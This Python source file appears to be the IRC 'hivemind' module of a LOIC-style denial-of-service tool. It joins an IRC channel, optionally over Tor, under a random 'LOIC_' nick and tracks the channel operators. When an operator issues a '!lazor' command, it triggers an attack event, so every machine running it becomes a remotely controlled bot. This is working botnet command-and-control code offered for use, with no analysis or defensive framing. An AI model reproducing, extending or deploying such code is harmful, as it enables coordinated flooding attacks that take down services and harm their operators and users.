import socket, threading, random, time
from Events import *
from Functions import *
from Log import *

class ListenThread(threading.Thread):

    def __init__(self, socket, irc):
        threading.Thread.__init__(self)

        self.socket = socket
        self.irc = irc
        self.readBuffer = ""
        self.running = True

    def stop(self):
        self.running = False

    def run(self):
        while self.running:
            try:
                self.readBuffer += self.socket.recv(1024)
            except:
                pass

            while self.readBuffer.find('\n') >= 0:
                breakPoint = self.readBuffer.find('\n')
                line = self.readBuffer[0:breakPoint].replace('\r', '')
                self.readBuffer = self.readBuffer[breakPoint+1:]
                event = Event(IRC_RECV, line)
                getEventManager().signalEvent(event)
        

class IRC:

    def __init__(self, host, port, channel):
        self.host = host
        self.port = port
        self.channel = channel
        self.online_hook = None
        
        self.socket = socket.socket()
        self.socket.settimeout(5)
        
        if self.host.endswith('.onion'):
            import socks
            self.socket.settimeout(30)
            self.socket = socks.socksocket(_sock=self.socket) 
            self.socket.setproxy(proxytype=socks.PROXY_TYPE_SOCKS5,addr='127.0.0.1',port=9050)
            

        self.connected = False

        self.nick = "LOIC_" + randomString(6)
        self.ops = []
        log( "Nick:"+ self.nick)

        getEventManager().addListener(IRC_RECV, self.parseIRCString)

        self.connect()

    def connect(self):
        self.listenThread = ListenThread(self.socket, self)

        try:
            self.socket.connect((self.host, self.port))
        except Exception as e:
            log( "error connecting, aborting "+str(e) )
            return
        if self.online_hook:
            self.online_hook()

        self.connected = True

        self.listenThread.start()

        self.socket.send("NICK %s\r\n" % self.nick)
        self.socket.send("USER IRCLOIC %s blah :Newfag's remote LOIC\r\n" % self.host)

    def changeChannel(self, newchannel):
        self.socket.send("PART %s\r\n" % self.channel)
        self.socket.send("JOIN %s\r\n" % newchannel)
        self.channel = newchannel

    def disconnect(self):
        self.connected = False
        self.stop()
        self.socket = socket.socket()
        self.socket.settimeout(5)
        if self.listenThread and self.listenThread.is_alive():
            self.listenThread.join()
        self.listenThread = None

    def deleteOp(self, op):
        self.ops[:] = (value for value in self.ops if value != op)

    def parseIRCString(self, event):
        string = event.arg
        if string.find("PING") == 0:
            self.socket.send("PONG " + string[5:] + "\r\n")
            log( "PONG "+ string[5:])
        elif string[0] == ":":
            #print string
            info = string.split(" ")
            if info[1] == "PRIVMSG" and info[2] == self.channel:
                if len(info) > 4 and info[3].lower() == ":!lazor":
                    name = info[0][1:info[0].find('!')]
                    if name in self.ops:
                        event = Event(LAZER_RECV, info[4:])
                        getEventManager().signalEvent(event)
            elif info[2] == self.nick and info[3] == self.channel:
                if len(info) > 5 and info[4].lower() == ":!lazor":
                    log("LAZOR")
                    event = Event(LAZER_RECV, info[4:])
                    getEventManager().signalEvent(event)
            elif info[1] == "MODE" and info[2] == self.channel:
                if info[3] == "+o":
                    self.ops.append(info[4])
                elif info[3] == "-o":
                    self.deleteOp(info[4])
            elif info[2] == self.nick and (info[3] == "=" or info[3] == "@") and info[4] == self.channel:
                for op in info[5:]:
                    if len(op) == 0:
                        continue
                    op = op.replace(':', '')
                    if op[0] == "@":
                        self.ops.append(op[1:])
                log( "Connection succesful")
                self.online_hook()
            elif info[1] == "002":
                self.socket.send("JOIN %s\r\n" % self.channel)
        else:
            log( "SCRAP " + string)
            if string == "ERROR :All connections in use":
                log( "retrying in 5 seconds")
                self.disconnect()

                event = Event(IRC_RESTART, None)
                getEventManager().signalEvent(event)

    def stop(self):
        if self.listenThread:
            self.listenThread.stop()
        
